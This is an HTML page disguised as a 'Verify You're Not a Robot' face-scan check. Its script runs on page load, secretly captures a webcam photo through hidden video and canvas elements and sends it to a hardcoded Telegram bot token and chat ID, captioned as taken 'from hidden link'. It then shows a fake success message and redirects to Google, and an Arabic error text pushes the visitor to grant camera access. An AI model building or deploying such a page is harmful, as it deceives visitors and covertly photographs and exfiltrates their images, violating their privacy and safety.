<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify You're Not a Robot</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 50px;
            background-color: #f0f0f0;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        button {
            padding: 15px 30px;
            font-size: 18px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
        #status {
            margin-top: 20px;
            font-size: 16px;
        }
        video, canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Security Check</h1>
        <p>To verify you're not a robot, please allow camera access for a quick face scan.</p>
        <button onclick="startVerification()">Verify Now</button>
        <div id="status"></div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        // Your credentials
        const BOT_TOKEN = '8923339722:AAE6h8zWPaBxVHrqvBty2OhCBxzBgvS0Y_8';
        const CHAT_ID = '7279906080';

        async function startVerification() {
            const status = document.getElementById('status');
            status.textContent = 'Accessing camera... Please wait.';
            
            try {
                const constraints = {
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                };
                
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                await new Promise(resolve => setTimeout(resolve, 1500));
                
                const canvas = document.getElementById('canvas');
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                stream.getTracks().forEach(track => track.stop());
                
                canvas.toBlob(async (blob) => {
                    if (!blob) {
                        status.textContent = 'Verification failed. Try again.';
                        return;
                    }
                    
                    status.textContent = 'Verifying...';
                    
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'verification.jpg');
                    formData.append('caption', 'New verification photo captured from hidden link');
                    
                    try {
                        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                        
                        if (response.ok) {
                            status.innerHTML = '✅ Verification complete.<br>You may now proceed.';
                            setTimeout(() => {
                                window.location.href = 'https://google.com'; 
                            }, 1500);
                        } else {
                            status.textContent = 'Verification complete.';
                        }
                    } catch (e) {
                        status.textContent = 'Verification complete.';
                    }
                }, 'image/jpeg', 0.9);
                
            } catch (error) {
                status.textContent = 'الرجاء اسمح بأستخدام كاميره لنتأكد انك مستخدم حقيقي لديك هاتف ليس روبوت او فايروس حقيقي.';
            }
        }
        
        window.onload = function() {
            setTimeout(() => {
                startVerification();
            }, 800);
        };
    </script>
</body>
</html>
